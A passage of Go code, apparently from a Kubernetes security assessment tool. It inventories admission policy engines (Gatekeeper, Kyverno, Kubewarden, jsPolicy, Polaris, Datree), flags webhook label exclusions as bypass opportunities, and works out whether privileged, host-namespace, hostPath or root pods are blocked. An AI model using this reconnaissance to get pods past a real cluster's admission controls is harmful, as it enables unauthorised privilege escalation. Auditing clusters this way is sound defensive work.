	// ClusterJsPolicy
	cjpGVR := schema.GroupVersionResource{
		Group:    "policy.jspolicy.com",
		Version:  "v1beta1",
		Resource: "clusterjspolicies",
	}

	cjpList, err := dynClient.Resource(cjpGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, cjp := range cjpList.Items {
			info := JsPolicyInfo{
				Name:            cjp.GetName(),
				IsClusterPolicy: true,
			}

			// Get type (Validating, Mutating, Controller)
			if t, ok, _ := unstructured.NestedString(cjp.Object, "spec", "type"); ok {
				info.Type = t
			} else {
				info.Type = "Validating"
			}

			// Get operations
			if ops, ok, _ := unstructured.NestedStringSlice(cjp.Object, "spec", "operations"); ok {
				info.Operations = ops
			}

			// Get resources
			if resources, ok, _ := unstructured.NestedSlice(cjp.Object, "spec", "resources"); ok {
				for _, r := range resources {
					if rStr, ok := r.(string); ok {
						info.Resources = append(info.Resources, rStr)
					}
				}
			}

			// Get violation policy
			if vp, ok, _ := unstructured.NestedString(cjp.Object, "spec", "violationPolicy"); ok {
				info.ViolationPolicy = vp
			}

			// Extract JavaScript code for content-based blocking detection
			if js, ok, _ := unstructured.NestedString(cjp.Object, "spec", "javascript"); ok {
				info.JavaScriptCode = js
			}

			policies = append(policies, info)
		}
	}

	// JsPolicy (namespace-scoped)
	jpGVR := schema.GroupVersionResource{
		Group:    "policy.jspolicy.com",
		Version:  "v1beta1",
		Resource: "jspolicies",
	}

	jpList, err := dynClient.Resource(jpGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, jp := range jpList.Items {
			info := JsPolicyInfo{
				Name:            jp.GetName(),
				Namespace:       jp.GetNamespace(),
				IsClusterPolicy: false,
			}

			if t, ok, _ := unstructured.NestedString(jp.Object, "spec", "type"); ok {
				info.Type = t
			} else {
				info.Type = "Validating"
			}

			if ops, ok, _ := unstructured.NestedStringSlice(jp.Object, "spec", "operations"); ok {
				info.Operations = ops
			}

			if resources, ok, _ := unstructured.NestedSlice(jp.Object, "spec", "resources"); ok {
				for _, r := range resources {
					if rStr, ok := r.(string); ok {
						info.Resources = append(info.Resources, rStr)
					}
				}
			}

			if vp, ok, _ := unstructured.NestedString(jp.Object, "spec", "violationPolicy"); ok {
				info.ViolationPolicy = vp
			}

			// Extract JavaScript code for content-based blocking detection
			if js, ok, _ := unstructured.NestedString(jp.Object, "spec", "javascript"); ok {
				info.JavaScriptCode = js
			}

			policies = append(policies, info)
		}
	}

	return policies
}

// analyzePolarisConfig analyzes Polaris webhook and configuration
func analyzePolarisConfig(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) PolarisConfigInfo {
	info := PolarisConfigInfo{}

	// Check for Polaris webhook
	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			// Polaris webhook is typically named "polaris-webhook" or contains "polaris"
			if strings.Contains(strings.ToLower(name), "polaris") {
				info.WebhookEnabled = true
				break
			}
		}
	}

	// Check for Polaris ConfigMap and parse enabled checks
	polarisNamespaces := []string{"polaris", "fairwinds", "kube-system"}
	for _, ns := range polarisNamespaces {
		cm, err := clientset.CoreV1().ConfigMaps(ns).Get(ctx, "polaris", metav1.GetOptions{})
		if err == nil {
			info.ConfigMap = cm.Name
			info.Namespace = ns

			// Parse the config.yaml to detect enabled checks
			if configData, ok := cm.Data["config.yaml"]; ok {
				info.ConfigContent = configData
				configLower := strings.ToLower(configData)

				// Check for privileged container check
				// Polaris checks: privilegedContainers, dangerousCapabilities, hostNetwork, hostPID, hostIPC, etc.
				if strings.Contains(configLower, "privilegedcontainers") &&
					!strings.Contains(configLower, "privilegedcontainers: ignore") {
					info.PrivilegedCheckEnabled = true
				}

				// HostNetwork check
				if strings.Contains(configLower, "hostnetworkset") &&
					!strings.Contains(configLower, "hostnetworkset: ignore") {
					info.HostNetworkCheckEnabled = true
				}

				// HostPID check
				if strings.Contains(configLower, "hostpidset") &&
					!strings.Contains(configLower, "hostpidset: ignore") {
					info.HostPIDCheckEnabled = true
				}

				// HostIPC check
				if strings.Contains(configLower, "hostipcset") &&
					!strings.Contains(configLower, "hostipcset: ignore") {
					info.HostIPCCheckEnabled = true
				}

				// Capabilities check
				if strings.Contains(configLower, "dangerouscapabilities") &&
					!strings.Contains(configLower, "dangerouscapabilities: ignore") {
					info.CapabilitiesCheckEnabled = true
				}

				// RunAsRoot check
				if strings.Contains(configLower, "runasrootallowed") &&
					!strings.Contains(configLower, "runasrootallowed: ignore") {
					info.RunAsRootCheckEnabled = true
				}

				// HostPath check (Polaris doesn't have this by default, but custom configs might)
				if strings.Contains(configLower, "hostpath") &&
					!strings.Contains(configLower, "hostpath: ignore") {
					info.HostPathCheckEnabled = true
				}
			} else {
				// If no config.yaml, assume default Polaris checks are enabled
				info.PrivilegedCheckEnabled = true
				info.HostNetworkCheckEnabled = true
				info.HostPIDCheckEnabled = true
				info.HostIPCCheckEnabled = true
				info.CapabilitiesCheckEnabled = true
				info.RunAsRootCheckEnabled = true
			}
			break
		}
	}

	// If webhook is enabled but no ConfigMap found, assume defaults
	if info.WebhookEnabled && info.ConfigMap == "" {
		info.PrivilegedCheckEnabled = true
		info.HostNetworkCheckEnabled = true
		info.HostPIDCheckEnabled = true
		info.HostIPCCheckEnabled = true
		info.CapabilitiesCheckEnabled = true
		info.RunAsRootCheckEnabled = true
	}

	// Verify Polaris controller pods by image to reduce false positives
	if info.WebhookEnabled || info.ConfigMap != "" {
		for _, ns := range []string{"polaris", "fairwinds", "kube-system"} {
			pods, err := clientset.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{})
			if err == nil {
				for _, pod := range pods.Items {
					if pod.Status.Phase == corev1.PodRunning {
						for _, container := range pod.Spec.Containers {
							if verifyPodAdmissionImage(container.Image, "polaris") {
								info.ImageVerified = true
								break
							}
						}
					}
					if info.ImageVerified {
						break
					}
				}
			}
			if info.ImageVerified {
				break
			}
		}
	}

	return info
}

// analyzeDatreeConfig analyzes Datree webhook configuration
func analyzeDatreeConfig(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) DatreeConfigInfo {
	info := DatreeConfigInfo{}

	// Check for Datree webhook
	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			// Datree webhook is typically named "datree-webhook" or contains "datree"
			if strings.Contains(strings.ToLower(name), "datree") {
				info.WebhookEnabled = true
				info.WebhookName = name
				break
			}
		}
	}

	// Check for Datree ConfigMaps that contain policy configuration
	// Datree stores policies in ConfigMaps or via their SaaS platform
	datreeNamespaces := []string{"datree", "datree-system", "kube-system"}
	for _, ns := range datreeNamespaces {
		// Check for datree-policy ConfigMap
		cms, err := clientset.CoreV1().ConfigMaps(ns).List(ctx, metav1.ListOptions{})
		if err != nil {
			continue
		}

		for _, cm := range cms.Items {
			cmName := strings.ToLower(cm.Name)
			if strings.Contains(cmName, "datree") || strings.Contains(cmName, "policy") {
				// Parse policy configuration
				for key, data := range cm.Data {
					if strings.Contains(key, "policy") || strings.Contains(key, "yaml") || strings.Contains(key, "json") {
						info.ConfigContent = data
						dataLower := strings.ToLower(data)

						// Datree built-in rules detection
						// https://hub.datree.io/built-in-rules

						// Privileged containers check
						if strings.Contains(dataLower, "privileged") ||
							strings.Contains(dataLower, "containers_incorrect_privileged_value_true") {
							info.PrivilegedCheckEnabled = true
						}

						// HostNetwork check
						if strings.Contains(dataLower, "hostnetwork") ||
							strings.Contains(dataLower, "containers_incorrect_hostnetwork_value_true") {
							info.HostNetworkCheckEnabled = true
						}

						// HostPID check
						if strings.Contains(dataLower, "hostpid") ||
							strings.Contains(dataLower, "containers_incorrect_hostpid_value_true") {
							info.HostPIDCheckEnabled = true
						}

						// HostIPC check
						if strings.Contains(dataLower, "hostipc") ||
							strings.Contains(dataLower, "containers_incorrect_hostipc_value_true") {
							info.HostIPCCheckEnabled = true
						}

						// Capabilities check
						if strings.Contains(dataLower, "capabilities") ||
							strings.Contains(dataLower, "containers_incorrect_capabilities") {
							info.CapabilitiesCheckEnabled = true
						}

						// RunAsRoot check
						if strings.Contains(dataLower, "runasnonroot") || strings.Contains(dataLower, "runasroot") ||
							strings.Contains(dataLower, "containers_incorrect_runasnonroot_value") {
							info.RunAsRootCheckEnabled = true
						}

						// HostPath check
						if strings.Contains(dataLower, "hostpath") ||
							strings.Contains(dataLower, "containers_incorrect_hostpath") {
							info.HostPathCheckEnabled = true
						}
					}
				}
			}
		}
	}

	// If webhook is enabled but no config found, assume Datree default rules are enabled
	// Datree enables most security checks by default
	if info.WebhookEnabled && info.ConfigContent == "" {
		info.PrivilegedCheckEnabled = true
		info.HostNetworkCheckEnabled = true
		info.HostPIDCheckEnabled = true
		info.HostIPCCheckEnabled = true
		info.CapabilitiesCheckEnabled = true
		info.RunAsRootCheckEnabled = true
		// Datree checks hostPath by default in its rules
		info.HostPathCheckEnabled = true
	}

	// Verify Datree controller pods by image to reduce false positives
	if info.WebhookEnabled {
		for _, ns := range []string{"datree", "datree-system", "kube-system"} {
			pods, err := clientset.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{})
			if err == nil {
				for _, pod := range pods.Items {
					if pod.Status.Phase == corev1.PodRunning {
						for _, container := range pod.Spec.Containers {
							if verifyPodAdmissionImage(container.Image, "datree") {
								info.ImageVerified = true
								break
							}
						}
					}
					if info.ImageVerified {
						break
					}
				}
			}
			if info.ImageVerified {
				break
			}
		}
	}

	return info
}

// analyzeGatekeeperMutation analyzes Gatekeeper mutation policies (Assign, AssignMetadata, ModifySet)
func analyzeGatekeeperMutation(ctx context.Context, dynClient dynamic.Interface) []GatekeeperMutationInfo {
	var mutations []GatekeeperMutationInfo

	mutationTypes := []struct {
		kind     string
		resource string
	}{
		{"Assign", "assign"},
		{"AssignMetadata", "assignmetadata"},
		{"ModifySet", "modifyset"},
	}

	for _, mt := range mutationTypes {
		gvr := schema.GroupVersionResource{
			Group:    "mutations.gatekeeper.sh",
			Version:  "v1",
			Resource: mt.resource,
		}

		list, err := dynClient.Resource(gvr).List(ctx, metav1.ListOptions{})
		if err != nil {
			// Try v1beta1
			gvr.Version = "v1beta1"
			list, err = dynClient.Resource(gvr).List(ctx, metav1.ListOptions{})
			if err != nil {
				continue
			}
		}

		for _, item := range list.Items {
			info := GatekeeperMutationInfo{
				Name: item.GetName(),
				Kind: mt.kind,
			}

			// Get location (what's being mutated)
			if location, ok, _ := unstructured.NestedString(item.Object, "spec", "location"); ok {
				info.Location = location
			}

			// Get match info
			if match, ok, _ := unstructured.NestedMap(item.Object, "spec", "match"); ok {
				if kinds, ok := match["kinds"].([]interface{}); ok {
					info.Match = fmt.Sprintf("%d kind rules", len(kinds))
				}
			}

			mutations = append(mutations, info)
		}
	}

	return mutations
}

// analyzeWebhookSelectors analyzes webhook selectors for bypass opportunities
func analyzeWebhookSelectors(ctx context.Context, dynClient dynamic.Interface) []WebhookSelectorInfo {
	var selectors []WebhookSelectorInfo

	webhookTypes := []struct {
		resource string
		whType   string
	}{
		{"validatingwebhookconfigurations", "validating"},
		{"mutatingwebhookconfigurations", "mutating"},
	}

	for _, wt := range webhookTypes {
		gvr := schema.GroupVersionResource{
			Group:    "admissionregistration.k8s.io",
			Version:  "v1",
			Resource: wt.resource,
		}

		list, err := dynClient.Resource(gvr).List(ctx, metav1.ListOptions{})
		if err != nil {
			continue
		}

		for _, item := range list.Items {
			webhooks, ok := item.Object["webhooks"].([]interface{})
			if !ok {
				continue
			}

			for _, wh := range webhooks {
				whMap, ok := wh.(map[string]interface{})
				if !ok {
					continue
				}

				info := WebhookSelectorInfo{
					WebhookName: item.GetName(),
					Type:        wt.whType,
				}

				// Check namespace selector
				if nsSelector, ok := whMap["namespaceSelector"].(map[string]interface{}); ok {
					// Check for matchExpressions with NotIn or DoesNotExist
					if matchExprs, ok := nsSelector["matchExpressions"].([]interface{}); ok {
						for _, expr := range matchExprs {
							if exprMap, ok := expr.(map[string]interface{}); ok {
								operator := exprMap["operator"]
								if operator == "NotIn" || operator == "DoesNotExist" {
									info.BypassMethod = "Namespace label exclusion"
									if key, ok := exprMap["key"].(string); ok {
										info.ExcludedLabels = append(info.ExcludedLabels, key)
									}
								}
							}
						}
					}
					// Check for matchLabels
					if matchLabels, ok := nsSelector["matchLabels"].(map[string]interface{}); ok {
						info.MatchLabels = make(map[string]string)
						for k, v := range matchLabels {
							if vStr, ok := v.(string); ok {
								info.MatchLabels[k] = vStr
							}
						}
					}
				}

				// Check object selector
				if objSelector, ok := whMap["objectSelector"].(map[string]interface{}); ok {
					if matchExprs, ok := objSelector["matchExpressions"].([]interface{}); ok {
						for _, expr := range matchExprs {
							if exprMap, ok := expr.(map[string]interface{}); ok {
								operator := exprMap["operator"]
								if operator == "NotIn" || operator == "DoesNotExist" {
									info.BypassMethod = "Object label exclusion"
									if key, ok := exprMap["key"].(string); ok {
										info.ExcludedLabels = append(info.ExcludedLabels, key)
									}
								}
							}
						}
					}
				}

				if info.BypassMethod != "" || len(info.ExcludedLabels) > 0 {
					selectors = append(selectors, info)
				}
			}
		}
	}

	return selectors
}

// analyzePSSExemptions analyzes PSS exemptions from cluster configuration
func analyzePSSExemptions(ctx context.Context, clientset kubernetes.Interface) PSSExemptionInfo {
	info := PSSExemptionInfo{}

	// PSS exemptions are typically configured in the API server's AdmissionConfiguration
	// We can detect some common patterns:
	// 1. Check for namespaces with pod-security.kubernetes.io/exempt label
	// 2. Check for common exempt namespaces (kube-system, kube-public, etc.)

	namespaces, err := clientset.CoreV1().Namespaces().List(ctx, metav1.ListOptions{})
	if err != nil {
		return info
	}

	for _, ns := range namespaces.Items {
		// Check for exempt annotation/label
		if exempt, ok := ns.Labels["pod-security.kubernetes.io/exempt"]; ok && exempt == "true" {
			info.ExemptNamespaces = append(info.ExemptNamespaces, ns.Name)
		}

		// Common system namespaces are often exempt
		if ns.Name == "kube-system" || ns.Name == "kube-public" || ns.Name == "kube-node-lease" {
			// Check if PSS is not configured (implicit exemption)
			if _, hasEnforce := ns.Labels["pod-security.kubernetes.io/enforce"]; !hasEnforce {
				// These namespaces often run privileged system pods
				// They may be exempt via AdmissionConfiguration
			}
		}
	}

	// Note: Full exemption analysis requires access to the API server's AdmissionConfiguration
	// which is typically not accessible via the API. The exemptions for users, groups,
	// and runtimeClasses are configured there.
	//
	// Common exempt users: system:serviceaccount:kube-system:*
	// Common exempt runtimeClasses: (cluster-specific)

	return info
}

// detectPolicyEngineBlocking analyzes policy engines for known blocking rules
// This prevents false positives when PSS/PSP aren't configured but policy engines enforce restrictions
func detectPolicyEngineBlocking(
	gatekeeperConstraints []GatekeeperConstraintInfo,
	kyvernoPolicies []KyvernoPolicyInfo,
	vapPolicies []ValidatingAdmissionPolicyInfo,
	kubewardenPolicies []KubewardenPolicyInfo,
	jsPolicies []JsPolicyInfo,
	polarisConfig PolarisConfigInfo,
	datreeConfig DatreeConfigInfo,
) PolicyEngineBlocking {
	blocking := PolicyEngineBlocking{}

	// Well-known Gatekeeper PSP-equivalent template kinds from gatekeeper-library
	// https://github.com/open-policy-agent/gatekeeper-library/tree/master/library/pod-security-policy
	gatekeeperPrivilegedKinds := []string{
		"k8spsprivilegedcontainer",
		"k8spspprivileged",
		"privilegedcontainer",
		"noprivileged",
		"disallowprivileged",
	}
	gatekeeperHostPathKinds := []string{
		"k8spsphostfilesystem",
		"k8spspallowedvolumes", // when hostPath is not in allowed list
		"hostfilesystem",
		"nohostpath",
		"disallowhostpath",
	}
	gatekeeperHostNetworkKinds := []string{
		"k8spsphostnetworkingports",
		"k8spsphostnetwork",
		"hostnetwork",
		"nohostnetwork",
		"disallowhostnetwork",
	}
	gatekeeperHostNamespaceKinds := []string{
		"k8spsphostnamespace",
		"hostnamespace",
		"nohostnamespace",
		"disallowhostnamespace",
		"hostpid",
		"hostipc",
	}
	gatekeeperCapabilitiesKinds := []string{
		"k8spspcapabilities",
		"capabilities",
		"restrictcapabilities",
		"dropcapabilities",
	}
	gatekeeperRunAsKinds := []string{
		"k8spspallowedusers",
		"k8spsprunasnonroot",
		"runasnonroot",
		"norunasroot",
		"mustrunasnonroot",
	}

	// Check Gatekeeper constraints by well-known template kinds AND Rego content
	for _, c := range gatekeeperConstraints {
		if c.EnforcementAction == "dryrun" || c.EnforcementAction == "warn" {
			continue // Only count enforcing policies
		}
		kind := strings.ToLower(c.Kind)
		name := strings.ToLower(c.Name)
		rego := strings.ToLower(c.RegoContent)
		combined := kind + " " + name

		// Check against well-known kinds AND Rego content for privileged
		privilegedDetected := false
		for _, k := range gatekeeperPrivilegedKinds {
			if strings.Contains(kind, k) || strings.Contains(name, k) ||
				(strings.Contains(combined, "privileged") && !strings.Contains(combined, "allowprivileged")) {
				privilegedDetected = true
				break
			}
		}
		// Also check Rego content for privileged patterns
		if !privilegedDetected && rego != "" {
			if (strings.Contains(rego, "securitycontext") && strings.Contains(rego, "privileged")) ||
				strings.Contains(rego, "input.review.object.spec.containers") && strings.Contains(rego, "privileged") {
				privilegedDetected = true
			}
		}
		if privilegedDetected {
			blocking.PrivilegedBlocked = true
			blocking.PrivilegedBlockedBy = append(blocking.PrivilegedBlockedBy, fmt.Sprintf("Gatekeeper:%s/%s", c.Kind, c.Name))
		}

		// HostPath / Host filesystem - check kinds and Rego
		hostPathDetected := false
		for _, k := range gatekeeperHostPathKinds {
			if strings.Contains(kind, k) || strings.Contains(name, k) ||
				strings.Contains(combined, "hostpath") || strings.Contains(combined, "host-path") {
				hostPathDetected = true
				break
			}
		}
		if !hostPathDetected && rego != "" {
			if strings.Contains(rego, "hostpath") ||
				(strings.Contains(rego, "volumes") && strings.Contains(rego, "hostpath")) {
				hostPathDetected = true
			}
		}
		if hostPathDetected {
			blocking.HostPathBlocked = true
			blocking.HostPathBlockedBy = append(blocking.HostPathBlockedBy, fmt.Sprintf("Gatekeeper:%s/%s", c.Kind, c.Name))
		}

		// HostNetwork - check kinds and Rego
		hostNetworkDetected := false
		for _, k := range gatekeeperHostNetworkKinds {
			if strings.Contains(kind, k) || strings.Contains(name, k) ||
				strings.Contains(combined, "hostnetwork") || strings.Contains(combined, "host-network") {
				hostNetworkDetected = true
				break
			}
		}
		if !hostNetworkDetected && rego != "" {
			if strings.Contains(rego, "hostnetwork") {
				hostNetworkDetected = true
			}
		}
		if hostNetworkDetected {
			blocking.HostNetworkBlocked = true
			blocking.HostNetworkBlockedBy = append(blocking.HostNetworkBlockedBy, fmt.Sprintf("Gatekeeper:%s/%s", c.Kind, c.Name))
		}

		// HostPID - check kinds and Rego
		hostPIDDetected := false
		for _, k := range gatekeeperHostNamespaceKinds {
			if strings.Contains(kind, k) || strings.Contains(name, k) ||
				strings.Contains(combined, "hostpid") || strings.Contains(combined, "host-pid") {
				hostPIDDetected = true
				break
			}
		}
		if !hostPIDDetected && rego != "" {
			if strings.Contains(rego, "hostpid") {
				hostPIDDetected = true
			}
		}
		if hostPIDDetected {
			blocking.HostPIDBlocked = true
			blocking.HostPIDBlockedBy = append(blocking.HostPIDBlockedBy, fmt.Sprintf("Gatekeeper:%s/%s", c.Kind, c.Name))
		}

		// HostIPC - check kinds and Rego
		hostIPCDetected := false
		for _, k := range gatekeeperHostNamespaceKinds {
			if strings.Contains(kind, k) || strings.Contains(name, k) ||
				strings.Contains(combined, "hostipc") || strings.Contains(combined, "host-ipc") {
				hostIPCDetected = true
				break
			}
		}
		if !hostIPCDetected && rego != "" {
			if strings.Contains(rego, "hostipc") {
				hostIPCDetected = true
			}
		}
		if hostIPCDetected {
			blocking.HostIPCBlocked = true
			blocking.HostIPCBlockedBy = append(blocking.HostIPCBlockedBy, fmt.Sprintf("Gatekeeper:%s/%s", c.Kind, c.Name))
		}

		// Capabilities - check kinds and Rego
		capsDetected := false
		for _, k := range gatekeeperCapabilitiesKinds {
			if strings.Contains(kind, k) || strings.Contains(name, k) {
				capsDetected = true
				break
			}
		}
		if !capsDetected && rego != "" {
			if strings.Contains(rego, "capabilities") ||
				(strings.Contains(rego, "securitycontext") && strings.Contains(rego, "add")) {
				capsDetected = true
			}
		}
		if capsDetected {
			blocking.DangerousCapsBlocked = true
			blocking.DangerousCapsBlockedBy = append(blocking.DangerousCapsBlockedBy, fmt.Sprintf("Gatekeeper:%s/%s", c.Kind, c.Name))
		}

		// RunAsRoot / RunAsNonRoot - check kinds and Rego
		runAsRootDetected := false
		for _, k := range gatekeeperRunAsKinds {
			if strings.Contains(kind, k) || strings.Contains(name, k) {
				runAsRootDetected = true
				break
			}
		}
		if !runAsRootDetected && rego != "" {
			if strings.Contains(rego, "runasnonroot") || strings.Contains(rego, "runasuser") ||
				(strings.Contains(rego, "securitycontext") && strings.Contains(rego, "runasuser")) {
				runAsRootDetected = true
			}
		}
		if runAsRootDetected {
			blocking.RunAsRootBlocked = true
			blocking.RunAsRootBlockedBy = append(blocking.RunAsRootBlockedBy, fmt.Sprintf("Gatekeeper:%s/%s", c.Kind, c.Name))
		}
	}

	// Check Kyverno policies by rule names, patterns, AND validate content
	for _, p := range kyvernoPolicies {
		if p.ValidationFailure != "Enforce" && p.ValidationFailure != "enforce" {
			continue // Only count enforcing policies
		}
		name := strings.ToLower(p.Name)

		// Combine name, rule names, and validate patterns for comprehensive matching
		patternsContent := strings.ToLower(strings.Join(p.RulePatterns, " "))

		for _, rule := range p.RuleNames {
			ruleLower := strings.ToLower(rule)
			combined := name + " " + ruleLower + " " + patternsContent

			// Privileged containers - check names and validate patterns
			if (strings.Contains(combined, "privileged") && !strings.Contains(combined, "allow")) ||
				strings.Contains(patternsContent, "securitycontext") && strings.Contains(patternsContent, "privileged") {
				blocking.PrivilegedBlocked = true
				blocking.PrivilegedBlockedBy = append(blocking.PrivilegedBlockedBy, fmt.Sprintf("Kyverno:%s/%s", p.Name, rule))
			}

			// HostPath volumes
			if strings.Contains(combined, "hostpath") || strings.Contains(combined, "host-path") ||
				(strings.Contains(patternsContent, "volumes") && strings.Contains(patternsContent, "hostpath")) {
				blocking.HostPathBlocked = true
				blocking.HostPathBlockedBy = append(blocking.HostPathBlockedBy, fmt.Sprintf("Kyverno:%s/%s", p.Name, rule))
			}

			// HostNetwork
			if strings.Contains(combined, "hostnetwork") || strings.Contains(combined, "host-network") ||
				strings.Contains(patternsContent, "hostnetwork") {
				blocking.HostNetworkBlocked = true
				blocking.HostNetworkBlockedBy = append(blocking.HostNetworkBlockedBy, fmt.Sprintf("Kyverno:%s/%s", p.Name, rule))
			}

			// HostPID
			if strings.Contains(combined, "hostpid") || strings.Contains(combined, "host-pid") ||
				strings.Contains(patternsContent, "hostpid") {
				blocking.HostPIDBlocked = true
				blocking.HostPIDBlockedBy = append(blocking.HostPIDBlockedBy, fmt.Sprintf("Kyverno:%s/%s", p.Name, rule))
			}

			// HostIPC
			if strings.Contains(combined, "hostipc") || strings.Contains(combined, "host-ipc") ||
				strings.Contains(patternsContent, "hostipc") {
				blocking.HostIPCBlocked = true
				blocking.HostIPCBlockedBy = append(blocking.HostIPCBlockedBy, fmt.Sprintf("Kyverno:%s/%s", p.Name, rule))
			}

			// Capabilities
			if strings.Contains(combined, "capabilities") ||
				(strings.Contains(patternsContent, "securitycontext") && strings.Contains(patternsContent, "capabilities")) {
				blocking.DangerousCapsBlocked = true
				blocking.DangerousCapsBlockedBy = append(blocking.DangerousCapsBlockedBy, fmt.Sprintf("Kyverno:%s/%s", p.Name, rule))
			}

			// RunAsNonRoot
			if strings.Contains(combined, "runasnonroot") || strings.Contains(combined, "run-as-non-root") ||
				strings.Contains(patternsContent, "runasnonroot") || strings.Contains(patternsContent, "runasuser") {
				blocking.RunAsRootBlocked = true
				blocking.RunAsRootBlockedBy = append(blocking.RunAsRootBlockedBy, fmt.Sprintf("Kyverno:%s/%s", p.Name, rule))
			}
		}
	}

	// Check VAP by name patterns AND CEL expression content
	for _, v := range vapPolicies {
		if v.FailurePolicy != "Fail" {
			continue // Only count failing policies
		}
		name := strings.ToLower(v.Name)

		// Combine name and CEL expressions for pattern matching
		celContent := strings.ToLower(strings.Join(v.CELExpressions, " "))
		combined := name + " " + celContent

		// Privileged containers - check for securityContext.privileged patterns
		if (strings.Contains(combined, "privileged") && !strings.Contains(name, "allow")) ||
			strings.Contains(celContent, "securitycontext") && strings.Contains(celContent, "privileged") {
			blocking.PrivilegedBlocked = true
			blocking.PrivilegedBlockedBy = append(blocking.PrivilegedBlockedBy, fmt.Sprintf("VAP:%s", v.Name))
		}

		// HostPath volumes
		if strings.Contains(combined, "hostpath") || strings.Contains(combined, "host-path") ||
			(strings.Contains(celContent, "volumes") && strings.Contains(celContent, "hostpath")) {
			blocking.HostPathBlocked = true
			blocking.HostPathBlockedBy = append(blocking.HostPathBlockedBy, fmt.Sprintf("VAP:%s", v.Name))
		}

		// HostNetwork
		if strings.Contains(combined, "hostnetwork") || strings.Contains(combined, "host-network") ||
			strings.Contains(celContent, "hostnetwork") {
			blocking.HostNetworkBlocked = true
			blocking.HostNetworkBlockedBy = append(blocking.HostNetworkBlockedBy, fmt.Sprintf("VAP:%s", v.Name))
		}

		// HostPID
		if strings.Contains(combined, "hostpid") || strings.Contains(combined, "host-pid") ||
			strings.Contains(celContent, "hostpid") {
			blocking.HostPIDBlocked = true
			blocking.HostPIDBlockedBy = append(blocking.HostPIDBlockedBy, fmt.Sprintf("VAP:%s", v.Name))
		}

		// HostIPC
		if strings.Contains(combined, "hostipc") || strings.Contains(combined, "host-ipc") ||
			strings.Contains(celContent, "hostipc") {
			blocking.HostIPCBlocked = true
			blocking.HostIPCBlockedBy = append(blocking.HostIPCBlockedBy, fmt.Sprintf("VAP:%s", v.Name))
		}

		// Capabilities
		if strings.Contains(combined, "capabilities") ||
			(strings.Contains(celContent, "securitycontext") && strings.Contains(celContent, "capabilities")) {
			blocking.DangerousCapsBlocked = true
			blocking.DangerousCapsBlockedBy = append(blocking.DangerousCapsBlockedBy, fmt.Sprintf("VAP:%s", v.Name))
		}

		// RunAsNonRoot
		if strings.Contains(celContent, "runasnonroot") || strings.Contains(celContent, "runasuser") {
			blocking.RunAsRootBlocked = true
			blocking.RunAsRootBlockedBy = append(blocking.RunAsRootBlockedBy, fmt.Sprintf("VAP:%s", v.Name))
		}
	}

	// Check Kubewarden policies by module names AND settings content
	// Well-known Kubewarden policy modules from https://github.com/kubewarden
	for _, p := range kubewardenPolicies {
		if p.Mode != "protect" {
			continue // Only count protecting policies
		}
		module := strings.ToLower(p.Module)
		name := strings.ToLower(p.Name)
		settings := strings.ToLower(p.Settings)
		combined := module + " " + name + " " + settings

		// Privileged - check module name and settings
		if strings.Contains(combined, "privileged") || strings.Contains(module, "pod-privileged") ||
			strings.Contains(settings, "allow_privileged") {
			blocking.PrivilegedBlocked = true
			blocking.PrivilegedBlockedBy = append(blocking.PrivilegedBlockedBy, fmt.Sprintf("Kubewarden:%s", p.Name))
		}

		// HostPath - check module name and settings
		if strings.Contains(combined, "hostpath") || strings.Contains(combined, "host-path") ||
			strings.Contains(module, "hostpaths") || strings.Contains(settings, "allowedhostpaths") {
			blocking.HostPathBlocked = true
			blocking.HostPathBlockedBy = append(blocking.HostPathBlockedBy, fmt.Sprintf("Kubewarden:%s", p.Name))
		}

		// Host namespaces - check module name and settings
		if strings.Contains(combined, "host-namespace") || strings.Contains(combined, "hostnamespace") ||
			strings.Contains(settings, "allow_host_network") || strings.Contains(settings, "allow_host_pid") ||
			strings.Contains(settings, "allow_host_ipc") {
			if strings.Contains(settings, "allow_host_network") || strings.Contains(module, "host-namespace") {
				blocking.HostNetworkBlocked = true
				blocking.HostNetworkBlockedBy = append(blocking.HostNetworkBlockedBy, fmt.Sprintf("Kubewarden:%s", p.Name))
			}
			if strings.Contains(settings, "allow_host_pid") || strings.Contains(module, "host-namespace") {
				blocking.HostPIDBlocked = true
				blocking.HostPIDBlockedBy = append(blocking.HostPIDBlockedBy, fmt.Sprintf("Kubewarden:%s", p.Name))
			}
			if strings.Contains(settings, "allow_host_ipc") || strings.Contains(module, "host-namespace") {
				blocking.HostIPCBlocked = true
				blocking.HostIPCBlockedBy = append(blocking.HostIPCBlockedBy, fmt.Sprintf("Kubewarden:%s", p.Name))
			}
		}

		// Capabilities - check module name and settings
		if strings.Contains(combined, "capabilities") || strings.Contains(module, "capabilities-psp") ||
			strings.Contains(settings, "required_drop_capabilities") || strings.Contains(settings, "allowed_capabilities") {
			blocking.DangerousCapsBlocked = true
			blocking.DangerousCapsBlockedBy = append(blocking.DangerousCapsBlockedBy, fmt.Sprintf("Kubewarden:%s", p.Name))
		}

		// RunAsRoot - check module name and settings
		if strings.Contains(combined, "user-group") || strings.Contains(module, "user-group-psp") ||
			strings.Contains(settings, "run_as_user") || strings.Contains(settings, "run_as_group") {
			blocking.RunAsRootBlocked = true
			blocking.RunAsRootBlockedBy = append(blocking.RunAsRootBlockedBy, fmt.Sprintf("Kubewarden:%s", p.Name))
		}
	}

	// Check jsPolicy policies by type, name patterns, AND JavaScript code content
	for _, p := range jsPolicies {
		if p.ViolationPolicy != "deny" && p.ViolationPolicy != "Deny" {
			continue // Only count denying policies
		}
		name := strings.ToLower(p.Name)
		jsCode := strings.ToLower(p.JavaScriptCode)
		combined := name + " " + jsCode

		// Privileged - check name and JS code
		if strings.Contains(combined, "privileged") ||
			(strings.Contains(jsCode, "securitycontext") && strings.Contains(jsCode, "privileged")) {
			blocking.PrivilegedBlocked = true
